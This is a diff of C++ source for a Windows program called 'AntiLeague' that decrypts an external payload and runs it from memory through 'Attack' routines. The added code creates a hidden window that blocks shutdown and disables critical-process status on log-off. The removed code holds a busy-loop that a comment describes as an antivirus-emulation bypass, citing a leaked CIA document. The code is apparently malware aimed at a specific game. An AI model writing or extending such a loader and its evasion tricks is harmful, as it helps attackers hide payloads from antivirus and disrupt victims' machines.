@@ -1,13 +1,14 @@
-#include <fstream>
 #include "MemoryModule.h"
 #include "c_AntiLeague.h"
+
+EXTERN_C IMAGE_DOS_HEADER __ImageBase;
 
 void c_AntiLeague::cipher()
 {
     if (dec_key.empty())
     {
         MessageBox(NULL, L"Decryption Key Empty", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
-        std::exit(1);
+        exit(1);
     }
 
     for (size_t i = 0; i <= payload.size(); i++)
@@ -25,45 +26,93 @@ void c_AntiLeague::gen_dec_key()
         dec_key[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
 }
 
+LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
+{
+    c_AntiLeague& AntiLeague = c_AntiLeague::getInstance();
+
+    if (msg != WM_ENDSESSION)
+    {
+        return DefWindowProc(hWnd, msg, wParam, lParam);
+    }
+
+    if (wParam == TRUE)
+    {
+        if ((lParam == 0) || ((lParam & ENDSESSION_LOGOFF) == ENDSESSION_LOGOFF))
+        {
+            AntiLeague.Attack<DisableCriticalProc>(DisableCriticalProc(), "DisableCritical", NULL);
+            ShutdownBlockReasonDestroy(hWnd);
+        }
+    }
+
+    return 0;
+}
+
+DWORD WINAPI SafeShutdown(LPVOID event)
+{
+    const wchar_t name[] = L"AntiLeague";
+    WNDCLASSEX wc = {};
+
+    wc.cbSize = sizeof(WNDCLASSEX);
+    wc.lpfnWndProc = &WndProc;
+    wc.hInstance = (HINSTANCE)&__ImageBase;
+    wc.lpszClassName = name;
+
+    if (!RegisterClassEx(&wc))
+    {
+        MessageBox(NULL, L"Can't Register Window Class", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
+        return 1;
+    }
+
+    HWND& hWnd = c_AntiLeague::getInstance().hWnd;
+    hWnd = CreateWindowEx(0, name, name, NULL, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, (HINSTANCE)&__ImageBase, NULL);
+
+    if (hWnd == NULL)
+    {
+        MessageBox(NULL, L"Can't Create Window", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
+        return 1;
+    }
+
+    SetEvent(event);
+    ShutdownBlockReasonCreate(hWnd, L"Preventing BSOD");
+
+    MSG msg;
+
+    while (GetMessage(&msg, hWnd, 0, 0))
+    {
+        DispatchMessage(&msg);
+    }
+
+    return msg.wParam;
+}
+
 void c_AntiLeague::Init()
 {
-    std::string _payload = getPayload();
-    std::ifstream infile(_payload, std::ios::binary);
+    std::string payloadLocation = getPayload();
+    LoadPayload(payloadLocation);
 
-    if (!infile.good())
+    HANDLE objects[2] = { NULL };
+    objects[1] = CreateEvent(NULL, TRUE, FALSE, NULL);
+
+    if (objects[1] == NULL)
     {
-        MessageBox(NULL, L"Can't Open Payload", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
-        std::exit(1);
+        MessageBox(NULL, L"Can't Create Event", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
+        exit(1);
     }
 
-    OVERLAPPED Overlapped = { NULL };
-    HANDLE hPayloadFile = CreateFileA(_payload.c_str(), GENERIC_ALL, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    LockFileEx(hPayloadFile, NULL, NULL, MAXDWORD, MAXDWORD, &Overlapped);
+    SafeShutdown = objects[0] = CreateThread(NULL, 0, &::SafeShutdown, objects[1], 0, NULL);
 
-    std::string payloadData((std::istreambuf_iterator<char>(infile)), (std::istreambuf_iterator<char>()));
-    infile.close();
-
-    if (payloadData.empty())
+    if (SafeShutdown == NULL)
     {
-        MessageBox(NULL, L"Payload Empty", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
-        std::exit(1);
+        MessageBox(NULL, L"Failed To Start Safe Shutdown Method", L"AntiLeague ERROR", MB_OK | MB_ICONERROR);
+        exit(1);
     }
 
-    payload = std::move(payloadData);
+    WaitForMultipleObjects(2, objects, FALSE, INFINITE);
 
-    // Apparently this method below has been shown to bypass AV emulation.
-    // Granted this information was from 2014, it doesn't hurt to include it. 
-    // Source: https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf
-    // Also, this shouldn't even be ran in the emulator since the payload
-    // (there is a payload existence check in the getPayload function) is 
-    // an external encrypted file with no extension. I'm assuming that it 
-    // will not likely be included in the emulation for such reason. 
+    if (WaitForSingleObject(objects[1], 0) != WAIT_OBJECT_0) //Failed
+    {
+        exit(1);
+    }
 
-    int count = 0;
-
-    for (int i = 0; i < 100000000; i++)
-        count++;
-
-    if (count == 100000000)
-        Attack<InitProc>(InitProc(), "Init", &_payload);
+    Attack<InitProc>(InitProc(), "Init", &payloadLocation);
 }
